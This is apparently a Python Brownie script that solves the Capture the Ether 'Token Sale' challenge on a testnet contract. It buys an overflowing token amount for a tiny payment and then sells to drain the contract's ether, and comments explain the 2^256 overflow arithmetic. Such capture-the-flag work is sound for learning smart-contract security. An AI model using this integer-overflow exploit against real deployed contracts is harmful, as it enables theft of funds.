from scripts.helpful_scripts import POINT_ONE, get_account, ONE
from brownie import TokenSaleChallenge, network, Contract


# for local test
def deploy_contract(contract, arg=None, value=0):
    account = get_account()
    return contract.deploy(arg, {"from": account, "value": value})


def main():
    # print(network.show_active())
    account = get_account()
    print(f"Attacker balance: {account.balance()}")
    # for local test
    # contract = deploy_contract(TokenSaleChallenge, account, ONE)
    # on ropsten network
    contract_address = "0x657E3c0c598d6D3436478434AD7462Df43fB95E8"
    contract = Contract.from_abi(
        TokenSaleChallenge._name,
        contract_address,
        TokenSaleChallenge.abi,
    )

    print(f"Attacker balance: {account.balance()}")
    print(f"Contract balance: {contract.balance()}")
    contract.buy(
        115792089237316195423570985008687907853269984665640564039458,
        {
            "from": account,
            "value": 415992086870360064,
        },
    )
    print(f"Attacker balance: {account.balance()}")
    print(f"Contract balance: {contract.balance()}")
    print(f"Our balance on contract: {contract.balanceOf(account)}")
    contract.sell(1, {"from": account})
    print(f"Attacker balance: {account.balance()}")
    print(f"Contract balance: {contract.balance()}")
    print(f"Our balance on contract: {contract.balanceOf(account)}")


# 2^256 = 115,792,089,237,316,195,423,570,985,008,687,907,853,269,984,665,640,564,039,457,584,007,913,129,639,936
# /10^18 = 115,792,089,237,316,195,423,570,985,008,687,907,853,269,984,665,640,564,039,457.584007913129639936
# floor = 11,579,208,923,731,619,542,357,098,500,868,790,785,326,998,466,564,056,403,9457
# +1 = 11,579,208,923,731,619,542,357,098,500,868,790,785,326,998,466,564,056,403,9458 -> NumTokens
# *10^18 = 115,792,089,237,316,195,423,570,985,008,687,907,853,269,984,665,640,564,039,458,000,000,000,000,000,000
# MOD = 415,992,086,870,360,064 -> msg.value
